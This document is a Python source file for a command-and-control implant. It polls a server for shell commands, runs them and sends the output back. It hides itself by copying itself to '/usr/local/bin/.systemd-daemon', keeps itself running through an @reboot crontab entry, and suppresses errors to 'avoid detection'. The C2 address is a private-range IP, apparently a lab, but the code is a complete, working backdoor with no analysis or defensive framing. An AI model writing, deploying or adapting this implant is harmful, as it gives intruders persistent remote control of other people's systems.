#!/usr/bin/env python3
import requests
import subprocess
import time
import os

C2_URL = "http://192.168.56.50:5000"
IMPLANT_PATH = "/usr/local/bin/.systemd-daemon"

def root_crontab():
    try:
        subprocess.check_output("sudo crontab -l", shell=True, text=True)
    except subprocess.CalledProcessError:
        os.system('echo "" | sudo crontab -')

def ensure_persistence():
    cron_entry = f"@reboot {IMPLANT_PATH} &\n"
    try:
        existing_cron = subprocess.check_output("crontab -l", shell=True, text=True)
        if cron_entry.strip() in existing_cron:
            return
    except subprocess.CalledProcessError:
        existing_cron = ''
    with open("/tmp/cronjob", "w") as cron_file:
        cron_file.write(existing_cron + cron_entry)
    os.system("crontab /tmp/cronjob && rm /tmp/cronjob")

def setup_stealth():
    if not os.path.exists(IMPLANT_PATH):
        os.system(f"cp {__file__} {IMPLANT_PATH}")
        os.system(f"chmod +x {IMPLANT_PATH}")

def fetch_command():
    """ Retrieves command from the C2 server """
    try:
        response = requests.get(f"{C2_URL}/get_command")
        return response.text.strip()
    except Exception as e:
        return None

def send_result(output):
    """ Sends command execution results to the C2 server """
    try:
        requests.post(f"{C2_URL}/send_result", data={"output": output})
    except Exception as e:
        pass  # Fail silently to avoid detection

def execute_command(command):
    """ Executes received command and sends output """
    try:
        output = subprocess.check_output(command, shell=True, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    send_result(output)

def main():
    root_crontab()
    setup_stealth()
    ensure_persistence()
    while True:
        command = fetch_command()
        if command and command.lower() != "none":
            execute_command(command)
        time.sleep(5)  # Polling interval

if __name__ == "__main__":
    main()
